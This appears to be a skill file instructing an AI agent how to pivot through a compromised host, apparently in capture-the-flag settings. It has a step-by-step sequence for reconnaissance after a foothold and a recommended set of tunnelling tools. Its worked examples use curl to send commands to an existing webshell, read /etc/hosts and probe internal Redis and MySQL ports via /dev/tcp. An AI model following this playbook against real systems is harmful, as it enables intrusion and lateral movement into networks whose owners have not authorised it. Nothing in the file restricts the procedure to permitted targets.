---
name: internal-pivot-flow
description: Use when an initial foothold exposes internal IP ranges, service names, route tables, or a need to reach services through a webshell or tunnel.
---

# Internal Pivot Flow

## Overview

Use this after a foothold. Build the network map first, then choose the lightest pivot that answers the next question.

## Required Sequence

1. On the foothold, run short commands: `id`, `hostname`, `ip -4 a`, `ip route`, `/etc/hosts`, `/proc/net/arp`, `/proc/net/route`.
2. Search local flags and configs before lateral movement.
3. Identify service names from `/etc/hosts`, env files, app configs, and source code.
4. Probe internal services with short timeouts from the foothold.
5. Prefer direct webshell-side testing or forward tunnels before reverse callbacks.
6. Record current foothold, reachable segment, next host/service, and cleanup.

## Tool Choices

- `fscan`: first internal service sweep when executable upload is possible.
- `suo5` / `Neo-reGeorg`: webshell-backed SOCKS or forward port access.
- `chisel` / `frp`: stable tunnel when direct webshell probing is insufficient.
- `proxychains`: only after a SOCKS path is proven.

## Example Scenario

Webshell already exists at `/uploads/shell.php`.

1. Read network state first:

```bash
curl -sG --data-urlencode 'cmd=ip -4 a' http://target/uploads/shell.php
curl -sG --data-urlencode 'cmd=ip route' http://target/uploads/shell.php
curl -sG --data-urlencode 'cmd=cat /etc/hosts' http://target/uploads/shell.php
```

2. `/etc/hosts` reveals `db` or `oa` aliases.
3. Probe just those hosts with short checks, not the whole subnet.
4. If direct webshell probing is clumsy, expose only one needed service with `suo5` or `Neo-reGeorg`.

Example: if `/etc/hosts` shows `db`, test Redis and MariaDB before any larger pivot:

```bash
curl -sG --data-urlencode 'cmd=timeout 2 bash -lc "echo >/dev/tcp/db/6379 && echo redis-open"' http://target/uploads/shell.php
curl -sG --data-urlencode 'cmd=timeout 2 bash -lc "echo >/dev/tcp/db/3306 && echo mysql-open"' http://target/uploads/shell.php
```

## Guardrails

- Avoid aggressive gateway probes that can hang or kill the target.
- Do not keep overlapping tunnels alive.
- Treat every new container as a fresh run; revalidate paths and footholds.
